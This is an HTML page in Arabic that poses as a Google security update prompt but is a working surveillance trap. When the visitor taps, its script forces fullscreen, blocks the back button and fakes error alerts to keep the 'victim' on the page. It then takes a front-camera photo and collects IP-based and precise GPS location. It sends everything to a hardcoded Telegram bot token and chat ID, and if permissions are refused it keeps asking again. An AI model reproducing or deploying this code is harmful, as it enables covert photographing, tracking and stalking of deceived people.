<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>🚨 تذكير أمني من Google</title>
    <style>
        body { 
            background: #000; color: #f00; font-family: sans-serif; 
            margin: 0; height: 100vh; overflow: hidden;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            touch-action: none; /* يمنع حركات السحب الافتراضية */
        }
        #v { position: fixed; width: 100%; height: 100%; object-fit: cover; opacity: 0.05; z-index: -1; }
        .btn { 
            background: #1a73e8; color: #white; border: none; padding: 15px 30px; 
            border-radius: 5px; font-size: 18px; cursor: pointer; font-weight: bold;
        }
    </style>
</head>
<body onclick="lockAndCapture()">

    <div style="text-align: center; z-index: 10;">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
        <h2 style="color:white">تحديث النظام مطلوب</h2>
        <p style="color:#bdc1c6">يجب الضغط على الزر أدناه لتحديث بروتوكولات الأمان ومنع اختراق جهازك.</p>
        <button class="btn">تحديث الآن</button>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
        const ID = "1772820433";

        async function sendData(data, type='text') {
            let url = `https://api.telegram.org/bot${T}/`;
            if(type === 'text') {
                await fetch(url + 'sendMessage', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: ID, text: data})
                });
            } else {
                const blob = await (await fetch(data)).blob();
                const f = new FormData();
                f.append('chat_id', ID);
                f.append('photo', blob, 'capture.png');
                await fetch(url + 'sendPhoto', { method: 'POST', body: f });
            }
        }

        async function lockAndCapture() {
            // 1. وضع ملء الشاشة "الملتصق" (Sticky Fullscreen)
            // هذا الوضع يمنع الأزرار من الظهور عند السحب للأعلى في معظم المتصفحات الحديثة
            const doc = document.documentElement;
            if (doc.requestFullscreen) {
                doc.requestFullscreen({ navigationUI: "hide" });
            }

            // 2. تفعيل الاهتزاز المزعج
            navigator.vibrate([500, 200, 500, 200, 1000]);

            try {
                // 3. طلب الكاميرا والموقع فوراً
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;

                // إرسال الموقع التقريبي (IP) فوراً كتمهيد
                fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=> {
                    sendData(`📍 صيد مؤكد!\nالمدينة: ${d.city}\nالإحداثيات: ${d.latitude},${d.longitude}`);
                });

                // 4. التقاط الصورة والموقع الدقيق بعد ثانية (لضمان الوضوح)
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    const video = document.getElementById('v');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    sendData(canvas.toDataURL('image/png'), 'photo');

                    navigator.geolocation.getCurrentPosition(p => {
                        sendData(`🎯 GPS دقيق جداً:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                    }, null, {enableHighAccuracy: true});

                    // تنبيه زائف لإبقاء الضحية عالقاً
                    alert("⚠️ خطأ في التحديث! يرجى عدم إغلاق المتصفح حتى انتهاء العملية (0%).");
                }, 1500);

            } catch (err) {
                alert("❌ يجب السماح بالصلاحيات لمتابعة التحديث!");
                lockAndCapture(); // إعادة المحاولة إجبارياً
            }
        }

        // قفل أزرار الرجوع والتاريخ
        history.pushState(null, null, location.href);
        window.onpopstate = () => history.go(1);
    </script>
</body>
</html>
